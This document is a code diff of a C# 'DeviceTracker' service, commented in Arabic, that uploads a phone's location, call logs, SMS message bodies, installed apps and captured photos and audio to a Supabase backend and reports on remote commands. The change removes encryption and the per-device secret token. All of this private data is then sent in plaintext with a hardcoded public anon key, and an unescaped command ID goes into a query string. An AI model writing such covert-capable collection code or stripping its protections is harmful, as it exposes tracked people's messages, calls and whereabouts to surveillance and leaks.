@@ -7,21 +7,11 @@ namespace DeviceTracker.Services;
 
 /// <summary>
 /// خدمة التواصل مع Supabase.
-/// تدعم وضعين:
-///   1. Direct REST API (مع anon key) — للقراءة فقط
-///   2. Edge Function /ingest — للكتابة الآمنة
-///
-/// المصادقة:
-///   - Direct: anon key (مكشوف في الكود، آمن نسبياً مع RLS)
-///   - Edge Function: device_token (سري لكل جهاز)
-///
-/// الوضع الافتراضي: Edge Function للكتابة، Direct للقراءة.
+/// تستخدم Direct REST API (مع anon key + RLS) للقراءة والكتابة.
 /// </summary>
 public sealed class SupabaseService : IDisposable
 {
-    private readonly HttpClient _directHttp;   // للقراءة (anon key)
-    private readonly HttpClient _ingestHttp;    // للكتابة (Edge Function)
-    private readonly EncryptionService _encryption;
+    private readonly HttpClient _http;
 
     private static string SupabaseUrl =>
         Preferences.Get("supabase_url", "https://zlhcseovfjilzgxdkskw.supabase.co");
@@ -30,32 +20,19 @@ public sealed class SupabaseService : IDisposable
         Preferences.Get("supabase_anon_key",
             "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InpsaGNzZW92ZmppbHpneGRrc2t3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODA2NTkxNjQsImV4cCI6MjA5NjIzNTE2NH0.tb8oMqMAHMoknDaY_1-GVvONYcG9YrjbnBcJFSJD0SI");
 
-    private static string DeviceToken =>
-        Preferences.Get("device_token", string.Empty);
+    private static string DeviceSerial =>
+        Preferences.Get("device_serial", string.Empty);
 
-    private static string EdgeFunctionUrl =>
-        $"{SupabaseUrl.TrimEnd('/')}/functions/v1/ingest/v1";
-
-    public SupabaseService(EncryptionService encryption)
+    public SupabaseService()
     {
-        _encryption = encryption;
-
-        // HttpClient للقراءة المباشرة (anon key)
-        _directHttp = new HttpClient
+        _http = new HttpClient
         {
             BaseAddress = new Uri(SupabaseUrl.TrimEnd('/') + "/rest/v1/"),
             Timeout = TimeSpan.FromSeconds(15)
         };
-        _directHttp.DefaultRequestHeaders.Add("apikey", AnonKey);
-        _directHttp.DefaultRequestHeaders.Authorization =
+        _http.DefaultRequestHeaders.Add("apikey", AnonKey);
+        _http.DefaultRequestHeaders.Authorization =
             new AuthenticationHeaderValue("Bearer", AnonKey);
-
-        // HttpClient لـ Edge Function (device token)
-        _ingestHttp = new HttpClient
-        {
-            BaseAddress = new Uri(EdgeFunctionUrl.TrimEnd('/') + "/"),
-            Timeout = TimeSpan.FromSeconds(30)
-        };
     }
 
     /// <summary>
@@ -77,7 +54,7 @@ public sealed class SupabaseService : IDisposable
 
             var json = JsonConvert.SerializeObject(payload);
             var content = new StringContent(json, Encoding.UTF8, "application/json");
-            var response = await _directHttp.PostAsync("rpc/register_device", content);
+            var response = await _http.PostAsync("rpc/register_device", content);
 
             if (response.IsSuccessStatusCode)
             {
@@ -111,15 +88,15 @@ public sealed class SupabaseService : IDisposable
         }
     }
 
-    /// <summary>
-    /// رفع بيانات الموقع — عبر Edge Function
-    /// </summary>
     public async Task<bool> PushLocationAsync(LocationRecord record)
     {
+        var serial = DeviceSerial;
+        if (string.IsNullOrEmpty(serial)) return false;
         return await IngestAsync("location_history", new
         {
-            latitude = _encryption.Encrypt(record.Latitude.ToString("F6")),
-            longitude = _encryption.Encrypt(record.Longitude.ToString("F6")),
+            device_serial = serial,
+            latitude = record.Latitude,
+            longitude = record.Longitude,
             altitude = record.Altitude,
             accuracy = record.Accuracy,
             speed = record.Speed,
@@ -128,65 +105,61 @@ public sealed class SupabaseService : IDisposable
         });
     }
 
-    /// <summary>
-    /// رفع حالة الجهاز — عبر Edge Function
-    /// </summary>
     public async Task<bool> PushDeviceStateAsync(DeviceStateRecord record)
     {
+        var serial = DeviceSerial;
+        if (string.IsNullOrEmpty(serial)) return false;
         return await IngestAsync("device_state_snapshots", new
         {
+            device_serial = serial,
             battery_level = record.BatteryLevel,
-            battery_status = record.BatteryStatus,
-            network_type = record.NetworkType,
-            storage_total = record.StorageTotal,
-            storage_available = _encryption.Encrypt(record.StorageAvailable.ToString()),
             is_charging = record.IsCharging,
+            network_type = record.NetworkType,
             captured_at = record.CapturedAt.ToString("o")
         });
     }
 
-    /// <summary>
-    /// رفع سجل مكالمة — عبر Edge Function
-    /// </summary>
     public async Task<bool> PushCallLogAsync(CallLogRecord record)
     {
+        var serial = DeviceSerial;
+        if (string.IsNullOrEmpty(serial)) return false;
         return await IngestAsync("call_logs", new
         {
-            phone_number = _encryption.Encrypt(record.PhoneNumber),
-            contact_name = _encryption.Encrypt(record.ContactName),
+            device_serial = serial,
+            phone_number = record.PhoneNumber,
+            contact_name = record.ContactName,
             call_type = record.CallType,
             duration_seconds = record.DurationSeconds,
             call_date = record.CallDate.ToString("o")
         });
     }
 
-    /// <summary>
-    /// رفع رسالة SMS — عبر Edge Function
-    /// </summary>
     public async Task<bool> PushSmsAsync(SmsRecord record)
     {
-        return await IngestAsync("sms_messages", new
-        {
-            phone_number = _encryption.Encrypt(record.PhoneNumber),
-            message_body = _encryption.Encrypt(record.MessageBody),
-            message_type = record.MessageType,
-            is_read = record.IsRead,
-            sms_date = record.SmsDate.ToString("o")
-        });
+        var serial = DeviceSerial;
+        if (string.IsNullOrEmpty(serial)) return false;
+            return await IngestAsync("sms_messages", new
+            {
+                device_serial = serial,
+                phone_number = record.PhoneNumber,
+                message_body = record.MessageBody,
+                message_type = record.MessageType,
+                sms_date = record.SmsDate.ToString("o")
+            });
     }
 
-    /// <summary>
-    /// رفع التطبيقات المثبتة — عبر Edge Function
-    /// </summary>
     public async Task<bool> PushInstalledAppsAsync(IEnumerable<InstalledAppRecord> apps)
     {
+        var serial = DeviceSerial;
+        if (string.IsNullOrEmpty(serial)) return false;
         var ok = true;
         foreach (var a in apps)
         {
             if (!await IngestAsync("installed_applications", new
             {
-                package_name = _encryption.Encrypt(a.PackageName),
-                app_name = _encryption.Encrypt(a.AppName),
+                device_serial = serial,
+                package_name = a.PackageName,
+                app_name = a.AppName,
                 version_name = a.VersionName,
                 version_code = a.VersionCode,
                 is_system_app = a.IsSystemApp,
@@ -196,24 +169,10 @@ public sealed class SupabaseService : IDisposable
         return ok;
     }
 
-    /// <summary>
-    /// تحديث حالة أمر عن بعد (تنفيذ/فشل) — عبر Edge Function
-    /// </summary>
-    public async Task<bool> UpdateCommandStatusAsync(string commandId, string status)
-    {
-        return await IngestAsync("command_status", new
-        {
-            command_id = commandId,
-            status,
-            executed_at = DateTime.UtcNow.ToString("o")
-        }, usePatch: true);
-    }
-
-    /// <summary>
-    /// رفع ملف وسائط (صورة/صوت) إلى Supabase Storage + تسجيل في media_captures
-    /// </summary>
     public async Task<bool> PushMediaCaptureAsync(MediaCaptureRecord record)
     {
+        var serial = DeviceSerial;
+        if (string.IsNullOrEmpty(serial)) return false;
         try
         {
             var storageUrl = await UploadFileAsync(record.FilePath, record.MediaType);
@@ -221,6 +180,7 @@ public sealed class SupabaseService : IDisposable
 
             return await IngestAsync("media_captures", new
             {
+                device_serial = serial,
                 media_type = record.MediaType,
                 file_url = storageUrl,
                 file_size_bytes = record.FileSizeBytes,
@@ -232,21 +192,33 @@ public sealed class SupabaseService : IDisposable
         catch { return false; }
     }
 
+    public async Task<bool> UpdateCommandStatusAsync(string commandId, string status)
+    {
+        var serial = DeviceSerial;
+        if (string.IsNullOrEmpty(serial)) return false;
+        try
+        {
+            var payload = new
+            {
+                status,
+                executed_at = DateTime.UtcNow.ToString("o")
+            };
+            var json = JsonConvert.SerializeObject(payload);
+            var content = new StringContent(json, Encoding.UTF8, "application/json");
+            var response = await _http.PatchAsync($"remote_commands?id=eq.{commandId}&device_serial=eq.{serial}", content);
+            return response.IsSuccessStatusCode;
+        }
+        catch { return false; }
+    }
+
     // ================================================================
-    //  الأساس: إرسال إلى Edge Function
+    //  الأساس: إرسال إلى REST API
     // ================================================================
 
-    private async Task<bool> IngestAsync(string table, object payload, bool usePatch = false)
+    private async Task<bool> IngestAsync(string table, object payload)
     {
         try
         {
-            var token = DeviceToken;
-            if (string.IsNullOrEmpty(token))
-            {
-                System.Diagnostics.Debug.WriteLine("[Supabase] No device token, skipping ingest");
-                return false;
-            }
-
             var json = JsonConvert.SerializeObject(payload,
                 Formatting.None,
                 new JsonSerializerSettings
@@ -255,14 +227,8 @@ public sealed class SupabaseService : IDisposable
                     DateTimeZoneHandling = DateTimeZoneHandling.Utc
                 });
 
-            var method = usePatch ? HttpMethod.Patch : HttpMethod.Post;
-            var request = new HttpRequestMessage(method, table)
-            {
-                Content = new StringContent(json, Encoding.UTF8, "application/json")
-            };
-            request.Headers.Add("x-device-token", token);
-
-            var response = await _ingestHttp.SendAsync(request);
+            var content = new StringContent(json, Encoding.UTF8, "application/json");
+            var response = await _http.PostAsync(table, content);
 
             if (!response.IsSuccessStatusCode)
             {
@@ -305,7 +271,7 @@ public sealed class SupabaseService : IDisposable
             request.Headers.Add("apikey", AnonKey);
             request.Headers.Authorization = new AuthenticationHeaderValue("Bearer", AnonKey);
 
-            var response = await _directHttp.SendAsync(request);
+            var response = await _http.SendAsync(request);
             return response.IsSuccessStatusCode ? storageUrl : null;
         }
         catch
@@ -347,7 +313,6 @@ public sealed class SupabaseService : IDisposable
 
     public void Dispose()
     {
-        _directHttp?.Dispose();
-        _ingestHttp?.Dispose();
+        _http?.Dispose();
     }
 }
